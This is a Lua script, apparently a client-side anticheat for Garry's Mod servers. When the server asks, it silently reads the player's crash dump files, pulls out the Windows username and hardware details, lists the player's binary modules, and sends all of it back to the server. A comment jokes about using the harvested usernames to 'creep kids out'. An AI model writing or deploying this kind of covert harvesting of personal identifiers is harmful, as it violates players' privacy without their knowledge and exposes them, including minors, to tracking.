local _pairs = pairs
local _type = type
local _net_Receive = net.Receive
local jitos = jit.os
local jitarch = jit.arch
local _cc_gt = concommand.GetTable
local _net_Start = net.Start
local _net_WriteString = net.WriteString
local _net_WriteUInt = net.WriteUInt
local _net_WriteData = net.WriteData
local _net_ReadData = net.ReadData
local _net_SendToServer = net.SendToServer
local _system_GetCountry = system.GetCountry
local _file_Find = file.Find

local comp = {}

for v,k in _pairs(iac.Config.BadCommands) do
	if _type(v) == "string" then -- table already sorted
		break	
	end

	comp[k] = true
end

iac.Config.BadCommands = comp

local function mdmp()
     local files,_ = file.Find("*.mdmp","BASE_PATH")

     for k,v in pairs(files) do
          local v = file.Read(v,"BASE_PATH")
          if v:match("^MDMP") then
               -- Found empty logs?
               mdfile = v
               break
          end
     end

     if not mdfile then return false end

     mdfile = string.Explode("\n",mdfile)

     local mdmpinfo = {}

     for k,v in pairs(mdfile) do
          -- Yes I know there are way better ways to do this, it was written in 10 minutes ok
          if v:match("Driver Name: ") then
               mdmpinfo["gfx"] = v:gsub("Driver Name: ","")
               continue
          elseif v:match("Total: ") then
               mdmpinfo["ram"] = v:gsub("Total: ","")
               continue
          elseif v:match("Users\\") and not v:match("awesomium") then
               -- You could also this if you wanted to creep kids out or something ( ???? )
               local a = v:match("Users\\.+\\"):gsub("Users\\",""):gsub("\\.*$","")
               mdmpinfo["user"] = a
               continue
          elseif v:match("VendorId / DeviceId: ") then
               local a = v:gsub("VendorId / DeviceId: ","")
               mdmpinfo["gfx vid/did"] = a
               continue
          end
     end

     mdfile = nil

     return mdmpinfo
end

_net_Receive("e621gaming", function()
	local f, bigf = _file_Find("lua/bin/*", "GAME")
	local myosid = _system_GetCountry().."-"..jitos.."-"..jitarch
	local dlls = pon.encode(f)
	local mdmps = pon.encode(mdmp())

	_net_Start("e621gimme")
	_net_WriteString(myosid)
	_net_WriteUInt(#dlls, 16)
	_net_WriteData(dlls, #dlls)
	_net_WriteUInt(#mdmps, 16)
	_net_WriteData(mdmps, #mdmps)
	_net_SendToServer()
end)
